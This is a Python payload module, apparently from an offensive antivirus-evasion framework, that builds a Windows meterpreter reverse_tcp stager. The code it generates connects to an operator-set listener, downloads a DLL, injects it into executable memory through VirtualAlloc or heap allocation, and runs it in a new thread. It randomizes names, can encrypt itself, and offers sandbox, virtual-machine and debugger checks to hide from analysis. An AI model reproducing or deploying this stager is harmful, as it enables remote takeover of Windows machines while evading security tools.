"""

Custom-written pure python meterpreter/reverse_tcp stager.

By @harmj0y

"""

from datetime import date
from datetime import timedelta
from Tools.Evasion.evasion_common import encryption
from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import gamemaker


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
        self.language = "python"
        self.extension = "py"
        self.rating = "Excellent"
        self.name = "Pure Python Reverse TCP Stager"
        self.path = "python/meterpreter/rev_tcp"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
            "LHOST"          : ["", "The listen target address"],
            "LPORT"          : ["4444", "The listen port"],
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
            "INJECT_METHOD"  : ["Virtual", "Virtual, Void, or Heap"],
            "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "CLICKTRACK"     : ["X", "Optional: Minimum number of clicks to execute payload"],
            "UTCCHECK"       : ["FALSE", "Optional: Validates system does not use UTC timezone"],
            "VIRTUALFILES"   : ["FALSE", "Optional: Check if VM supporting files exist"],
            "VIRTUALDLLS"    : ["FALSE", "Check for dlls loaded in memory"],
            "CURSORMOVEMENT" : ["FALSE", "Check if cursor is in same position after 30 seconds"],
            "USERPROMPT"     : ["FALSE", "Make user click prompt prior to execution"],
            "MINRAM"         : ["FALSE", "Check for at least 3 gigs of RAM"],
            "SANDBOXPROCESS" : ["FALSE", "Check for common sandbox processes"],
            "DETECTDEBUG"    : ["FALSE", "Check if debugger is present"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
        }

    def generate(self):

        # randomize all of the variable names used
        shellCodeName = evasion_helpers.randomString()
        socketName = evasion_helpers.randomString()
        getDataMethodName = evasion_helpers.randomString()
        fdBufName = evasion_helpers.randomString()
        rcvStringName = evasion_helpers.randomString()
        rcvCStringName = evasion_helpers.randomString()

        injectMethodName = evasion_helpers.randomString()
        tempShellcodeName = evasion_helpers.randomString()
        shellcodeBufName = evasion_helpers.randomString()
        fpName = evasion_helpers.randomString()
        tempCBuffer = evasion_helpers.randomString()
        randctypes = evasion_helpers.randomString()


        payload_code = "import struct, socket, binascii, ctypes as " + randctypes + ", random, time\n"

        # How I'm tracking the number of nested tabs needed
        # to make the payload
        num_tabs_required = 0

        payload_code2, num_tabs_required = gamemaker.senecas_games(self)
        payload_code = payload_code + payload_code2

        # socket and shellcode variables that need to be kept global
        payload_code += '\t' * num_tabs_required + "%s, %s = None, None\n" % (shellCodeName,socketName)

        # build the method that creates a socket, connects to the handler,
        # and downloads/patches the meterpreter .dll
        payload_code += '\t' * num_tabs_required + "def %s():\n" %(getDataMethodName)
        payload_code += '\t' * num_tabs_required + "\ttry:\n"
        payload_code += '\t' * num_tabs_required + "\t\tglobal %s\n" %(socketName)
        # build the socket and connect to the handler
        payload_code += '\t' * num_tabs_required + "\t\t%s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" %(socketName)
        payload_code += '\t' * num_tabs_required + "\t\t%s.connect(('%s', %s))\n" %(socketName,self.required_options["LHOST"][0],self.required_options["LPORT"][0])
        # pack the underlying socket file descriptor into a c structure
        payload_code += '\t' * num_tabs_required + "\t\t%s = struct.pack('<i', %s.fileno())\n" % (fdBufName,socketName)
        # unpack the length of the payload, received as a 4 byte array from the handler
        payload_code += '\t' * num_tabs_required + "\t\tl = struct.unpack('<i', %s.recv(4))[0]\n" %(socketName)
        payload_code += '\t' * num_tabs_required + "\t\t%s = b\"     \"\n" % (rcvStringName)
        # receive ALL of the payload .dll data
        payload_code += '\t' * num_tabs_required + "\t\twhile len(%s) < l: %s += %s.recv(l)\n" % (rcvStringName, rcvStringName, socketName)
        payload_code += '\t' * num_tabs_required + "\t\t" + rcvCStringName + " = " + randctypes + ".create_string_buffer(%s, len(%s))\n" % (rcvStringName,rcvStringName)
        # prepend a little assembly magic to push the socket fd into the edi register
        payload_code += '\t' * num_tabs_required + "\t\t%s[0] = binascii.unhexlify('BF')\n" %(rcvCStringName)
        # copy the socket fd in
        payload_code += '\t' * num_tabs_required + "\t\tfor i in range(4): %s[i+1] = %s[i]\n" % (rcvCStringName, fdBufName)
        payload_code += '\t' * num_tabs_required + "\t\treturn %s\n" % (rcvCStringName)
        payload_code += '\t' * num_tabs_required + "\texcept: return None\n"

        # build the method that injects the .dll into memory
        payload_code += '\t' * num_tabs_required + "def %s(%s):\n" %(injectMethodName,tempShellcodeName)
        payload_code += '\t' * num_tabs_required + "\tif %s != None:\n" %(tempShellcodeName)
        payload_code += '\t' * num_tabs_required + "\t\t%s = bytearray(%s)\n" %(shellcodeBufName,tempShellcodeName)

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            # allocate enough virtual memory to stuff the .dll in
            payload_code += "\t\t" + fpName + " = " + randctypes + ".windll.kernel32.VirtualAlloc(" + randctypes + ".c_int(0)," + randctypes + ".c_int(len(" + shellcodeBufName + "))," + randctypes + ".c_int(0x3000)," + randctypes + ".c_int(0x40))\n"
            # virtual lock to prevent the memory from paging out to disk
            payload_code += "\t\t" + tempCBuffer + " = (" + randctypes + ".c_char * len(" + shellcodeBufName + ")).from_buffer(" + shellcodeBufName + ")\n"
            # copy the .dll into the allocated memory
            payload_code += "\t\t" + randctypes + ".windll.kernel32.RtlMoveMemory(" + randctypes + ".c_int(" + fpName + "), " + tempCBuffer + ", " + randctypes + ".c_int(len(" + shellcodeBufName + ")))\n"
            # kick the thread off to execute the .dll
            payload_code += "\t\tht = " + randctypes + ".windll.kernel32.CreateThread(" + randctypes + ".c_int(0)," + randctypes + ".c_int(0)," + randctypes + ".c_int(" + fpName + ")," + randctypes + ".c_int(0)," + randctypes + ".c_int(0)," + randctypes + ".pointer(" + randctypes + ".c_int(0)))\n"
            # wait for the .dll execution to finish
            payload_code += "\t\t" + randctypes + ".windll.kernel32.WaitForSingleObject(" + randctypes + ".c_int(ht)," + randctypes + ".c_int(-1))\n"

        # Assume HEAP Injection
        else:
            HeapVar = evasion_helpers.randomString()
            handleName = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + "\t\t" + HeapVar + ' = ' + randctypes + '.windll.kernel32.HeapCreate(' + randctypes + '.c_int(0x00040000),' + randctypes + '.c_int(len(' + shellcodeBufName + ') * 2),' + randctypes + '.c_int(0))\n'
            payload_code += '\t' * num_tabs_required + "\t\t" + fpName + ' = ' + randctypes + '.windll.kernel32.HeapAlloc(' + randctypes + '.c_int(' + HeapVar + '),' + randctypes + '.c_int(0x00000008),' + randctypes + '.c_int(len( ' + shellcodeBufName + ')))\n'
            payload_code += '\t' * num_tabs_required + "\t\t" + tempCBuffer + ' = (' + randctypes + '.c_char * len(' + shellcodeBufName + ')).from_buffer(' + shellcodeBufName + ')\n'
            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + fpName + '),' + tempCBuffer + ',' + randctypes + '.c_int(len(' + shellcodeBufName + ')))\n'
            payload_code += '\t' * num_tabs_required + "\t\t" + handleName + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + fpName + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + handleName + '),' + randctypes + '.c_int(-1))\n'

        # download the stager
        payload_code += '\t' * num_tabs_required + "%s = %s()\n" %(shellCodeName, getDataMethodName)
        # inject what we grabbed
        payload_code += '\t' * num_tabs_required + "%s(%s)\n" % (injectMethodName, shellCodeName)

        if self.required_options["USE_PYHERION"][0].lower() == "y":
            payload_code = encryption.pyherion(payload_code)

        self.payload_source_code = payload_code
        return
